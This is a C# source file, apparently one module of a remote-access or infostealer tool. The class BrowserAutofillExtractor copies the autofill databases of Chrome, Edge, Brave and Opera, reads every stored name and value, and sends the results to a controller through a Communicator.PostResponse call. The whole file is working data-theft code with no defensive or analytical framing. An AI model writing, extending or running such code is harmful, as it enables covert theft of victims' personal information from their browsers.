using System;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    internal static class BrowserAutofillExtractor
    {
        private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static readonly (string dbPath, string browser)[] Targets =
        {
            (@"Google\Chrome\User Data\Default\Web Data", "Chrome"),
            (@"Microsoft\Edge\User Data\Default\Web Data", "Edge"),
            (@"BraveSoftware\Brave-Browser\User Data\Default\Web Data", "Brave"),
            (@"Opera Software\Opera Stable\Web Data", "Opera")
        };

        public static async Task ExtractAsync()
        {
            StringBuilder result = new();

            foreach (var (relativePath, browser) in Targets)
            {
                try
                {
                    string fullPath = Path.Combine(LocalAppData, relativePath);
                    if (!File.Exists(fullPath))
                    {
                        Logger.Warn($"[Autofill] {browser}: Web Data file not found.");
                        continue;
                    }

                    string tempPath = Path.GetTempFileName();
                    File.Copy(fullPath, tempPath, true);

                    using var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;");
                    conn.Open();

                    using var cmd = new SQLiteCommand("SELECT name, value FROM autofill", conn);
                    using var reader = cmd.ExecuteReader();

                    int count = 0;
                    while (reader.Read())
                    {
                        string name = reader.GetString(0);
                        string value = reader.GetString(1);
                        result.AppendLine($"[{browser}] {name}: {value}");
                        count++;
                    }

                    if (count == 0)
                        result.AppendLine($"[{browser}] No autofill entries found.");

                    conn.Close();
                    File.Delete(tempPath);
                }
                catch (Exception ex)
                {
                    Logger.Error($"[Autofill] {browser} failed: {ex.Message}");
                }
            }

            if (result.Length == 0)
                result.Append("(no autofill data found)");

            await Communicator.PostResponse("browser_autofill", result.ToString().Trim());
        }
    }
}
